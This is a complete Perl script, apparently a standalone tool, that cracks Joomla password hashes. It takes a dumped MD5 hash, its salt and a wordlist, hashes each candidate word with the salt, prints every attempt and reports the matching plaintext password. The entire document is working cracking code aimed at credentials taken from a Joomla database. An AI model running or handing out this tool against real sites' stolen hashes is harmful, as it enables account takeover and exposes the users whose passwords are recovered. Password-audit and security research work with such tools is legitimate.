#!/usr/bin/perl
# crack joomla! password using dumped hash and salt
#
# perl joomlacrack.pl a87248e5fc69972804f5bb93c873ee9d 9W11uZafPxbe9xpL wordlist.txt
#


use Digest::MD5;

if(!defined($ARGV[0]&& $ARGV[1]&& $ARGV[2])){

system (clear);
print "--- Joomla hash crack\n";
print "---\n";


print ("Usage: perl $0 hash salt wordlist\n\n");
exit; }

$hash = $ARGV[0];
$salt = $ARGV[1];
$wordlist = $ARGV[2];

system (clear);
print "\n[*] hashed password set to $hash\n";
print "[*] salt set to $salt\n";
print "[*] wordlist set to $wordlist\n";
sleep(2);

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";

print "\n[+] Cracking ...\n\n";

while ($password = <LIST>) {

chomp ($password);

$key = $password.$salt;

$md5 = Digest::MD5->new;
$md5->add($key);
$digest = $md5->hexdigest;

print "[*] trying $password => $digest ...\n";


if ($digest eq $hash)
{
print "\n#####################################################################\n";
print "[+] Your password is $password\n";
print "#####################################################################\n\n";

close(LIST);
exit;
}
}
close(LIST);
print "\n[-] All failed\n";
